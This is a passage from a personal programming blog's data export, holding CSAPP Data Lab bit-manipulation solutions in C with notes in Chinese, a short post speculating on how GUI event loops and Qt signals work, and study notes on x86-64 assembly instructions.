id=\"isLessOrEqual\"><a href=\"#isLessOrEqual\" class=\"headerlink\" title=\"isLessOrEqual\"></a>isLessOrEqual</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 24</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLessOrEqual</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !!(x&gt;&gt;<span class=\"number\">31</span>&amp;~(y&gt;&gt;<span class=\"number\">31</span>)) | !(~(x&gt;&gt;<span class=\"number\">31</span>)&amp;(y&gt;&gt;<span class=\"number\">31</span>))&amp;(x+~y+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">31</span>) | !(x^y);</span><br><span class=\"line\">\t<span class=\"comment\">//equal to  !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-9\"><a href=\"#思路-9\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><code>x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y</code></li>\n</ul>\n<h3 id=\"ilog2\"><a href=\"#ilog2\" class=\"headerlink\" title=\"ilog2\"></a>ilog2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: ilog2(16) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 90</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ilog2</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-10\"><a href=\"#思路-10\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>先构造从最高的1到最低位均为1的二进制，然后类似bitCount</li>\n</ul>\n<h3 id=\"float-neg\"><a href=\"#float-neg\" class=\"headerlink\" title=\"float_neg\"></a>float_neg</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 10</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_neg</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; (t&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">8</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf^<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-11\"><a href=\"#思路-11\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>判别是否是NaN。先判断尾数是否全0，然后用<code>(t&gt;&gt;23)+1&gt;&gt;8</code>判断exp是否全1</li>\n</ul>\n<h3 id=\"float-i2f\"><a href=\"#float-i2f\" class=\"headerlink\" title=\"float_i2f\"></a>float_i2f</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Result is returned as unsigned int, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_i2f</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> shiftLeft=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> afterShift, tmp, flag;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> absX=x;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> sign=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//special case</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//if x &lt; 0, sign = 1000...,abs_x = -x</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sign=<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">        absX=-x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    afterShift=absX;</span><br><span class=\"line\">    <span class=\"comment\">//count shift_left and after_shift</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tmp=afterShift;</span><br><span class=\"line\">        afterShift&lt;&lt;=<span class=\"number\">1</span>;</span><br><span class=\"line\">        shiftLeft++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tmp &amp; <span class=\"number\">0x80000000</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x01ff</span>)&gt;<span class=\"number\">0x0100</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x03ff</span>)==<span class=\"number\">0x0300</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> sign + (afterShift&gt;&gt;<span class=\"number\">9</span>) + ((<span class=\"number\">159</span>-shiftLeft)&lt;&lt;<span class=\"number\">23</span>) + flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//from http://www.cnblogs.com/tenlee/p/4951639.html</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-12\"><a href=\"#思路-12\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>分情况处理0、负数、正数</p>\n</li>\n<li><p>要处理舍人</p>\n<blockquote>\n<ul>\n<li>向接近的舍入</li>\n<li>如果处于中间，向偶数舍入</li>\n</ul>\n</blockquote>\n</li>\n<li><p>舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的</p>\n</li>\n</ul>\n<h3 id=\"float-twict\"><a href=\"#float-twict\" class=\"headerlink\" title=\"float_twict\"></a>float_twict</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_twice</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp = t&amp;<span class=\"number\">0x7F800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp2 = uf&amp;<span class=\"number\">0xFF800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> expFull = !(temp^<span class=\"number\">0x7F800000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; expFull)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(expFull)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!(t&amp;<span class=\"number\">0x7F800000</span>))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">unsigned</span> k = (uf&amp;<span class=\"number\">0x7FFFFF</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2+(k&lt;&lt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (temp&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">23</span> | uf&amp;<span class=\"number\">0x807FFFFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-13\"><a href=\"#思路-13\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>分情况处理三种IEEE754的情况</li>\n<li>需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了</li>\n</ul>\n","slug":"CSAPP-Data-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"初学GUI的一些理解（瞎猜）","date":"2017-08-11T10:15:36.000Z","path":"2017/08/11/初学GUI的一些理解（瞎猜）/","text":"应该把整个程序运行过程分解为： 描述一个界面(前端) show出来 进入无限循环 在循环里按照刷新频率show这个界面 每次循环里还检测是否有输入，如果没有，就继续下一次循环 如果有，就像控制台程序一样，接受输入，给出输出 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源) 也就是说，我把一个窗口程序分解为 定义图形 重复画图 对输入给出输出的类似控制台程序 在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数) 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数) 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数) 所谓发射出去，我猜测如下 GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次) 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环) 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环","raw":"---\ntitle: 初学GUI的一些理解（瞎猜）\ntoc:\ncomments: true\nmathjax: true\ndate: 2017-08-11 18:15:36\ntags:\n- GUI\n- Qt\ndescription:\ncategories:\n- 开发\n---\n- 应该把整个程序运行过程分解为：\n\n  1. 描述一个界面(前端)\n\n  - show出来\n  - 进入无限循环\n  - 在循环里按照刷新频率show这个界面\n  - 每次循环里还检测是否有输入，如果没有，就继续下一次循环\n  - 如果有，就像控制台程序一样，接受输入，给出输出\n  - 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)\n\n- 也就是说，我把一个窗口程序分解为\n\n  1. 定义图形\n  2. 重复画图\n  3. 对输入给出输出的类似控制台程序\n\n\n- 在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端\n- 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)\n- 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。\n- 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)\n- 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来\n- 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数\n- 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)\n- 所谓发射出去，我猜测如下\n  1. GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)\n  2. 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)\n  3. 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环\n","content":"<ul>\n<li><p>应该把整个程序运行过程分解为：</p>\n<ol>\n<li>描述一个界面(前端)</li>\n</ol>\n<ul>\n<li>show出来</li>\n<li>进入无限循环</li>\n<li>在循环里按照刷新频率show这个界面</li>\n<li>每次循环里还检测是否有输入，如果没有，就继续下一次循环</li>\n<li>如果有，就像控制台程序一样，接受输入，给出输出</li>\n<li>当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)</li>\n</ul>\n</li>\n<li><p>也就是说，我把一个窗口程序分解为</p>\n<ol>\n<li>定义图形</li>\n<li>重复画图</li>\n<li>对输入给出输出的类似控制台程序</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端</li>\n<li>进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)</li>\n<li>以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。</li>\n<li>接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)</li>\n<li>如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来</li>\n<li>但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数</li>\n<li>如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)</li>\n<li>所谓发射出去，我猜测如下<ol>\n<li>GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)</li>\n<li>组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)</li>\n<li>把该消息放在共享的那块内存，然后每个组件都执行一次消息循环</li>\n</ol>\n</li>\n</ul>\n","slug":"初学GUI的一些理解（瞎猜）","categories":[{"name":"开发","slug":"开发","permalink":"https://h-zex.github.io/categories/开发/"}],"tags":[{"name":"GUI","slug":"GUI","permalink":"https://h-zex.github.io/tags/GUI/"},{"name":"Qt","slug":"Qt","permalink":"https://h-zex.github.io/tags/Qt/"}]},{"title":"汇编相关","date":"2017-08-06T14:35:44.000Z","path":"2017/08/06/汇编相关/","text":"MOV 操作数不能都是memory register must match the suffix movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展 movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register movz、movs系列have a register or memory location as the source and a register as the destination. cltq: SignExtend(%eax) -&gt; %rax movzlq不存在，可以用movl实现。但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在 其他指令 leaq: has no other size variants The destination operand must be a register. Unary Operations: operand can be either a register or a memory location. Binary Operations: the second operand is used as both a source and a destination the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location. the two operands can’t both be memory location when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory. Shift Operations shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift shift amount can be imm value or %cl a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63 destination can be register or memory location 浮点指令 vmovss, vmovd的操作数可以是（第一个source，第二个destination） memory， XMM XMM， memory 按照书上的描述，好像还可以XMM， XMM vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。 vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM） vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已） vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss） vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq） vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样 MISC intel format have reverse order operands; Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value Such a reference has four components: an immediate offset Imm, a base register rb, an index register ri, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers. Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0 后缀的匹配","raw":"---\ntitle: 汇编相关\ntags:\n- 汇编\ntoc: flase\ncomments: true\nmathjax: true\ncategories:\n- CSAPP\ndate: 2017-08-06 22:35:44\ndescription: CSAPP提到的汇编相关知识点\n---\n#### MOV\n\n- 操作数不能都是memory\n- register must match the suffix\n- movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展\n- movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register\n- movz、movs系列have a register or memory location as the source and a register as the destination.\n- cltq: SignExtend(%eax) -> %rax\n- movzlq不存在，可以用movl实现。**但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在**\n\n#### 其他指令\n\n- leaq:\n  -  has no other size variants\n  -  The destination operand must be a register.\n- Unary Operations:\n  -  operand can be either a register or a memory location. \n- Binary Operations:\n  - the second operand is used as both a source and a destination\n  - the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.\n  - the two operands can't both be memory location\n  - when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.\n- Shift Operations\n  - shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift\n  - shift amount can be imm value or %cl\n  - a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63\n  - destination can be register or memory location\n\n## 浮点指令\n\n- vmovss, vmovd的操作数可以是（第一个source，第二个destination）\n  - memory， XMM\n  - XMM， memory\n  - 